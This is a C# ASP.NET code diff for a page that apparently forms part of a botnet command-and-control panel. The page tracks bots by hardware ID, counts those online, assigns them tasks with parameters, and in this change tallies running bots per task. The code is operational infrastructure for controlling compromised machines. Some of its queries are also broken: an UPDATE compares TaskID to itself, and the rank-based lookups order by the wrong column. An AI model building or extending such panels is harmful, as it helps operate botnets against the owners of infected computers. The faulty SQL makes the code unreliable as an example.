@@ -33,7 +33,7 @@ public partial class Tasks : System.Web.UI.Page
                 lblTotalBots.Text = connTotal.ToString();
             }
 
-            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())));", conn))
+            using (SqlCommand cmd = new SqlCommand("SELECT count(distinct HWID) FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -10 , GETDATE())));", conn))
             {
                 onnlineNow = (int)cmd.ExecuteScalar();
                 lblOnnlineNow.Text = onnlineNow.ToString();
@@ -63,6 +63,69 @@ public partial class Tasks : System.Web.UI.Page
                 lblConnectionsMonth.Text = connMonth.ToString();
                 connMonthPre = Math.Round((double)(100 * connMonth) / connTotal, 1);
                 connMonthPrec.Text = "data-percent=\"" + connMonthPre + "\"";
+            }
+
+            int TaskAmount;
+            int BotAmount;
+
+            using (SqlCommand cmd = new SqlCommand("select count(distinct TaskID) from Tasks", conn))
+            {
+                TaskAmount = (int)cmd.ExecuteScalar();
+            }
+
+            for (int i = 1; i <= TaskAmount; i++)
+            {
+                int TaskID = 0;
+                int online = 0;
+                using (SqlCommand cmd = new SqlCommand("select TaskID from(select TaskID,DENSE_RANK() over (order by HWID) as rownum from Tasks) as tbl where tbl.rownum = @i", conn))
+                {
+                    cmd.Parameters.AddWithValue("i", i);
+                    TaskID = (int)cmd.ExecuteScalar();
+                    cmd.Parameters.Clear();
+                }
+
+                using (SqlCommand cmd = new SqlCommand("select count(HWID) from Tasks where TaskID = @TaskID", conn))
+                {
+                    cmd.Parameters.AddWithValue("TaskID", TaskID);
+                    BotAmount = (int)cmd.ExecuteScalar();
+                    cmd.Parameters.Clear();
+                }
+
+                for (int n = 1; n <= BotAmount; n++)
+                {
+                    string hwid = "";
+                    DateTime date = new DateTime();
+                    DateTime time30 = Settings.getDate();
+                    DateTime timenow = Settings.getDate();
+                    timenow = timenow.AddSeconds(10);
+                    time30 = time30.AddSeconds(-10);
+
+                    using (SqlCommand cmd = new SqlCommand("select HWID from(select HWID,DENSE_RANK() over (order by HWID) as rownum from Tasks) as tbl where tbl.rownum = @n", conn))
+                    {
+                        cmd.Parameters.AddWithValue("n", n);
+                        hwid = (string)cmd.ExecuteScalar();
+                        cmd.Parameters.Clear();
+                    }
+
+                    using (SqlCommand cmd = new SqlCommand("SELECT LastConn FROM Bots WHERE Hwid = @HWID", conn))
+                    {
+                        cmd.Parameters.AddWithValue("HWID", hwid);
+                        date = (DateTime)cmd.ExecuteScalar();
+                        cmd.Parameters.Clear();
+                    }
+
+                    if (date > time30 && date < timenow)
+                    {
+                        online++;
+                    }
+                }
+                using (SqlCommand cmd = new SqlCommand("UPDATE Tasks SET Running = @Running Where TaskID = TaskID", conn))
+                {
+                    cmd.Parameters.AddWithValue("Running", online);
+                    cmd.Parameters.AddWithValue("TaskID", TaskID);
+                    cmd.ExecuteNonQuery();
+                    cmd.Parameters.Clear();
+                }
             }
             fillgrid();
         }
@@ -227,7 +290,6 @@ public partial class Tasks : System.Web.UI.Page
 
                 if (Amount < 1)
                 {
-                    lblConnectionsMonth.Text = Amount.ToString();
                     using (SqlCommand cmd = new SqlCommand("INSERT INTO Tasks VALUES (@TaskID,@UserID, @Type, @Parameter1, @Parameter2, @Parameter3, @Parameter4, @Max, @Running, @Filter, @Status, @HWID)", conn))
                     {
                         cmd.Parameters.AddWithValue("TaskID", TaskID);
@@ -249,12 +311,9 @@ public partial class Tasks : System.Web.UI.Page
                 else
                 {
                     lblError.Text = "One or more bots could not be added cause they are already performing this particular task";
-
                 }
-
-                
             }
-            Array.Clear(Bots,0,Bots.Length);
+            Array.Clear(Bots, 0, Bots.Length);
         }
     }
 
